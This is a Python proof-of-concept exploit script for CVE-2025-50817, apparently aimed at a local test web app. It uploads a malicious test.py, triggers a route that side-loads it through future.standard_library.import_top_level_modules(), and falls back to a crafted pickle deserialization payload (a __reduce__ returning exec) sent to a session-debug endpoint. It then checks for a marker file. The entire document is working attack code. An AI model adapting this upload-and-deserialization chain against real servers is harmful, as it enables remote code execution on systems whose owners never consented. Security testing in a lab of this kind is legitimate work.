import base64
import pickle
import tempfile
import time

import requests

BASE_URL = "http://localhost:5000"
MARKER_FILE = f"pwned_by_cve_2025_50817_{int(time.time())}.txt"
MARKER_TEXT = f"CVE-2025-50817 Exploit Successful! marker={MARKER_FILE}"


def build_test_module() -> str:
    return (
        "with open(%r, 'w', encoding='utf-8') as f:\n"
        "    f.write(%r)\n"
        "print('[!] CVE-2025-50817 payload executed from side-loaded test.py')\n"
    ) % (MARKER_FILE, MARKER_TEXT)


def upload_test_module() -> bool:
    print("[*] Uploading malicious test.py to /upload-recipe...")
    payload = build_test_module().encode("utf-8")

    with tempfile.NamedTemporaryFile(suffix=".py", delete=False) as tmp:
        tmp.write(payload)
        local_path = tmp.name

    try:
        with open(local_path, "rb") as f:
            files = {"recipe": ("test.py", f, "text/x-python")}
            response = requests.post(f"{BASE_URL}/upload-recipe", files=files, timeout=10)
        if response.status_code == 200:
            print("[+] Uploaded test.py to kitchen storage")
            return True
        print(f"[-] Upload failed with status {response.status_code}")
        return False
    except Exception as e:
        print(f"[-] Upload error: {e}")
        return False


def marker_exists() -> bool:
    try:
        response = requests.get(
            f"{BASE_URL}/asset-viewer",
            params={"path": MARKER_FILE},
            timeout=10,
        )
        return MARKER_TEXT in response.text
    except Exception:
        return False


def trigger_sync_route() -> str:
    print("[*] Triggering /sync-ingredients (original CVE route)...")
    response = requests.get(f"{BASE_URL}/sync-ingredients", timeout=10)
    print(f"[+] /sync-ingredients response: {response.text}")
    return response.text


class TriggerImportTopLevelModules:
    def __reduce__(self):
        code = (
            "import future.standard_library as _sl;"
            "_sl.import_top_level_modules()"
        )
        return (exec, (code,))


def trigger_via_deserialization():
    print("[*] Fallback trigger via /session-debug to invoke import_top_level_modules()...")
    token = base64.b64encode(pickle.dumps(TriggerImportTopLevelModules())).decode("ascii")
    response = requests.get(
        f"{BASE_URL}/session-debug",
        params={"token": token},
        timeout=10,
    )
    print(f"[+] /session-debug response code: {response.status_code}")


def main():
    print("[+] Prepared unique marker file:", MARKER_FILE)
    if not upload_test_module():
        return

    time.sleep(1)
    trigger_sync_route()
    time.sleep(1)

    if marker_exists():
        print("[SUCCESS] Exploit verified via /sync-ingredients path.")
        return

    print(
        "[-] /sync-ingredients did not execute test.py in this runtime. "
        "Trying deterministic CVE primitive call."
    )

    try:
        trigger_via_deserialization()
    except Exception as e:
        print(f"[-] Fallback trigger error: {e}")
        return

    time.sleep(1)
    if marker_exists():
        print(
            "[SUCCESS] Exploit verified. future.standard_library.import_top_level_modules() "
            "side-loaded test.py and executed payload."
        )
    else:
        print("[-] Exploit verification failed. Marker file not found/readable.")


if __name__ == "__main__":
    main()
